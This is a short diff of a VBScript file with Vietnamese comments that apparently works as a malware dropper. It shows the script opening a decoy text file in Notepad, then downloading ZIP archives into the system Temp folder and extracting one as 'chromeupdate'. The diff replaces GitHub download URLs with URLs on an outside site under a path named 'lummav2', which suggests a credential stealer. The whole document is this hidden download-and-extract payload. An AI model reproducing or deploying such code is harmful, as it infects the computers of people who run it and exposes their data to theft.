@@ -24,8 +24,8 @@ shell.Run "notepad.exe """ & txtPath & """", 1, False
 
 ' URL của các file ZIP
 
-url1 = "https://github.com/2UY5/1/raw/refs/heads/main/PyEnv1.zip"
-url2 = "https://github.com/2UY5/1/raw/refs/heads/main/PyEnv2.zip"
+url1 = "https://t91.site/lummav2/python.zip"
+url2 = "https://t91.site/lummav2/pythonv2.zip"
 
 ' Lấy thư mục Temp thật của hệ thống
 Set shell = CreateObject("WScript.Shell")
@@ -84,5 +84,6 @@ zip2 = tempFolder & "chromeupdate.zip"
 If DownloadFile(url2, zip2) Then
     ExtractZip zip2, tempFolder & "chromeupdate"
 End If
+
 
 
